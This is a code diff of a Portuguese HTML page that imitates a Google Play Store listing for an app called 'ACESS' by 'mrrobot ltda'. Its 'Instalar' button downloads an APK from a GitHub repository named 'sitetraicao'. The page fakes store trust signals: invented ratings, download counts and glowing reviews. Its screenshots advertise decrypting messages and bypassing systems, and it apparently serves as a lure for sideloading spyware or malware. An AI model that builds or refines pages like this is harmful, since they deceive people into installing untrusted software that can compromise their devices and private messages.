@@ -4,10 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Acess</title>
-    <!-- Fonte Oficial do Google -->
+
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    <!-- Ícones do Google -->
-    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet">
+
     <style>
         :root {
             --play-green: #01875f;
@@ -23,7 +23,7 @@
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            -webkit-tap-highlight-color: transparent; /* Remove highlight azul no toque */
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
@@ -35,7 +35,6 @@
             overflow-x: hidden;
         }
 
-        /* Top Bar - Estilo Mobile da Play Store */
         .top-app-bar {
             display: flex;
             align-items: center;
@@ -58,10 +57,9 @@
         }
 
         .container {
-            padding: 0 0 80px 0; /* Espaço para não esconder conteúdo no final */
+            padding: 0 0 80px 0;
         }
 
-        /* App Header (Ícone, Título e Dev) */
         .app-header {
             display: flex;
             padding: 16px 24px;
@@ -98,19 +96,19 @@
             text-decoration: none;
             margin-bottom: 2px;
         }
-        
+
         .app-info-extra {
             font-size: 12px;
             color: var(--text-secondary);
         }
 
-        /* Stats Row (Avaliação, Downloads, Faixa Etária) */
         .stats-scroll-wrapper {
             overflow-x: auto;
-            scrollbar-width: none; /* Firefox */
+            scrollbar-width: none;
         }
+
         .stats-scroll-wrapper::-webkit-scrollbar {
-            display: none; /* Safari/Chrome */
+            display: none;
         }
 
         .stats-row {
@@ -129,7 +127,6 @@
             position: relative;
         }
 
-        /* Linhas separadoras */
         .stat-block:not(:first-child)::before {
             content: '';
             position: absolute;
@@ -171,7 +168,6 @@
             border-radius: 2px;
         }
 
-        /* Action Buttons (Instalar) */
         .action-container {
             padding: 0 24px 24px 24px;
         }
@@ -181,7 +177,7 @@
             color: white;
             border: none;
             padding: 12px 24px;
-            border-radius: 24px; /* Bordas arredondadas estilo novo da Play Store */
+            border-radius: 24px;
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
@@ -198,7 +194,6 @@
             background-color: var(--play-green-hover);
         }
 
-        /* Galeria de Screenshots */
         .screenshots-scroll {
             display: flex;
             overflow-x: auto;
@@ -207,13 +202,13 @@
             scroll-snap-type: x mandatory;
             scrollbar-width: none;
         }
-        
+
         .screenshots-scroll::-webkit-scrollbar {
             display: none;
         }
 
         .screenshot-img {
-            height: 280px; /* Altura ideal para mobile */
+            height: 280px;
             width: auto;
             border-radius: 8px;
             box-shadow: 0 1px 2px rgba(0,0,0,0.2);
@@ -221,7 +216,6 @@
             object-fit: cover;
         }
 
-        /* Seções Gerais (Sobre, Resenhas) */
         .section-container {
             padding: 24px;
         }
@@ -244,13 +238,12 @@
             color: var(--text-secondary);
             line-height: 1.4;
             display: -webkit-box;
-            -webkit-line-clamp: 3; /* Limita a 3 linhas inicialmente */
+            -webkit-line-clamp: 3;
             -webkit-box-orient: vertical;
             overflow: hidden;
             text-overflow: ellipsis;
         }
 
-        /* Ratings & Reviews */
         .ratings-overview {
             display: flex;
             gap: 24px;
@@ -271,7 +264,7 @@
             gap: 2px;
             margin-top: 4px;
         }
-        
+
         .rating-stars-fill .star {
             font-size: 12px;
         }
@@ -282,7 +275,6 @@
             margin-top: 4px;
         }
 
-        /* Barras de progresso das avaliações */
         .rating-bars {
             flex: 1;
             display: flex;
@@ -313,7 +305,6 @@
             border-radius: 4px;
         }
 
-        /* Cards de Review */
         .review-card {
             margin-bottom: 24px;
         }
@@ -369,20 +360,18 @@
             color: var(--text-secondary);
         }
 
-        /* Separador leve entre seções */
         .divider {
             height: 8px;
             background-color: #f1f3f4;
             width: 100%;
         }
-
     </style>
 </head>
-<body>
 
-    <!-- Barra de Navegação Mobile -->
+<body>
     <div class="top-app-bar">
         <span class="material-symbols-outlined">arrow_back</span>
+
         <div class="actions">
             <span class="material-symbols-outlined">search</span>
             <span class="material-symbols-outlined">more_vert</span>
@@ -390,9 +379,13 @@
     </div>
 
     <div class="container">
-        <!-- Cabeçalho (Ícone, Título, Desenvolvedor) -->
         <header class="app-header">
-            <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=300&h=300&q=80" alt="Ícone do App" class="app-icon">
+            <img
+                src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=300&h=300&q=80"
+                alt="Ícone do App"
+                class="app-icon"
+            >
+
             <div class="app-title-section">
                 <h1 class="app-title">ACESS</h1>
                 <a href="#" class="app-developer">mrrobot ltda</a>
@@ -400,33 +393,40 @@
             </div>
         </header>
 
-        <!-- Estatísticas com scroll horizontal se necessário -->
         <div class="stats-scroll-wrapper">
             <div class="stats-row">
                 <div class="stat-block">
-                    <div class="stat-top">4,9 <span class="material-symbols-outlined star">star</span></div>
+                    <div class="stat-top">
+                        4,9
+                        <span class="material-symbols-outlined star">star</span>
+                    </div>
                     <div class="stat-bottom">43 mil aval.</div>
                 </div>
+
                 <div class="stat-block">
                     <div class="stat-top">1 mi+</div>
                     <div class="stat-bottom">Downloads</div>
                 </div>
+
                 <div class="stat-block">
-                    <div class="stat-top"><span class="badge-rating">L</span></div>
+                    <div class="stat-top">
+                        <span class="badge-rating">L</span>
+                    </div>
                     <div class="stat-bottom">Livre</div>
                 </div>
             </div>
         </div>
 
-        <!-- Botão Instalar -->
-<!-- Botão Instalar -->
-<div class="action-container">
-    <a href="https://raw.githubusercontent.com/mrelliotaldersonfuck/sitetraicao/main/acesso.apk" download="acesso.apk" class="install-btn">
-        Instalar
-    </a>
-</div>
+        <div class="action-container">
+            <a
+                href="https://github.com/mrelliotaldersonfuck/sitetraicao/raw/refs/heads/main/acesso.apk"
+                download="acesso.apk"
+                class="install-btn"
+            >
+                Instalar
+            </a>
+        </div>
 
-        <!-- Galeria de Imagens (Scroll Horizontal Nativo) -->
         <div class="screenshots-scroll">
             <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=400&h=750&q=80" alt="Terminal Background" class="screenshot-img">
             <img src="https://placehold.co/400x750/000000/00FF00.png?text=ACCESS+GRANTED%0A%0AMessages+Decrypted!&font=source-code-pro" alt="Access Granted Message" class="screenshot-img">
@@ -434,20 +434,21 @@
             <img src="https://placehold.co/400x750/000000/00FF00.png?text=SYSTEM+BYPASS%0A%0AConnection+Established&font=source-code-pro" alt="System Bypass" class="screenshot-img">
         </div>
 
-        <!-- Sobre o app -->
         <div class="section-container">
             <div class="section-header">
                 <h2 class="section-title">Sobre este app</h2>
                 <span class="material-symbols-outlined">arrow_forward</span>
             </div>
+
             <p class="about-text">
-                O Acess é a sua ferramenta definitiva para explorar novos conteúdos e tendências. Com uma interface moderna e intuitiva, você pode navegar de forma rápida e segura. Nossa arquitetura foi totalmente otimizada para garantir que o app rode de forma leve.
+                O Acess é a sua ferramenta definitiva para explorar novos conteúdos e tendências.
+                Com uma interface moderna e intuitiva, você pode navegar de forma rápida e segura.
+                Nossa arquitetura foi totalmente otimizada para garantir que o app rode de forma leve.
             </p>
         </div>
 
         <div class="divider"></div>
 
-        <!-- Avaliações -->
         <div class="section-container">
             <div class="section-header">
                 <h2 class="section-title">Classificações e resenhas</h2>
@@ -457,6 +458,7 @@
             <div class="ratings-overview">
                 <div>
                     <div class="rating-huge">4,9</div>
+
                     <div class="rating-stars-fill">
                         <span class="material-symbols-outlined star">star</span>
                         <span class="material-symbols-outlined star">star</span>
@@ -464,10 +466,10 @@
                         <span class="material-symbols-outlined star">star</span>
                         <span class="material-symbols-outlined star">star</span>
                     </div>
+
                     <div class="rating-count">43.000 aval.</div>
                 </div>
-                
-                <!-- Barras estilo Play Store -->
+
                 <div class="rating-bars">
                     <div class="bar-row">5 <div class="bar-bg"><div class="bar-fill" style="width: 90%;"></div></div></div>
                     <div class="bar-row">4 <div class="bar-bg"><div class="bar-fill" style="width: 5%;"></div></div></div>
@@ -477,12 +479,12 @@
                 </div>
             </div>
 
-            <!-- Comentário 1 -->
             <div class="review-card">
                 <div class="reviewer-info">
                     <div class="avatar" style="background-color: #E91E63;">A</div>
                     <div class="reviewer-name">Ana Beatriz</div>
                 </div>
+
                 <div class="review-meta">
                     <div class="rating-stars-fill">
                         <span class="material-symbols-outlined star">star</span>
@@ -493,9 +495,11 @@
                     </div>
                     <div class="review-date">10/09/2026</div>
                 </div>
+
                 <div class="review-content">
                     Aplicativo excelente! A interface é muito amigável. Achei genial a atenção aos detalhes da equipe, passa muita segurança e não assusta o usuário. Vale as 5 estrelas!
                 </div>
+
                 <div class="helpful-actions">
                     142 pessoas acharam isso útil
                     <div style="flex-grow: 1;"></div>
@@ -504,12 +508,12 @@
                 </div>
             </div>
 
-            <!-- Comentário 2 -->
             <div class="review-card">
                 <div class="reviewer-info">
                     <div class="avatar" style="background-color: #00BCD4;">L</div>
                     <div class="reviewer-name">Lucas Mendes</div>
                 </div>
+
                 <div class="review-meta">
                     <div class="rating-stars-fill">
                         <span class="material-symbols-outlined star">star</span>
@@ -520,9 +524,11 @@
                     </div>
                     <div class="review-date">05/09/2026</div>
                 </div>
+
                 <div class="review-content">
                     Roda extremamente liso! Não tive nenhum problema de travamento ou fechamento forçado. Recomendo baixar.
                 </div>
+
                 <div class="helpful-actions">
                     89 pessoas acharam isso útil
                     <div style="flex-grow: 1;"></div>
@@ -530,9 +536,7 @@
                     <span class="material-symbols-outlined">more_vert</span>
                 </div>
             </div>
-
         </div>
     </div>
-
 </body>
 </html>
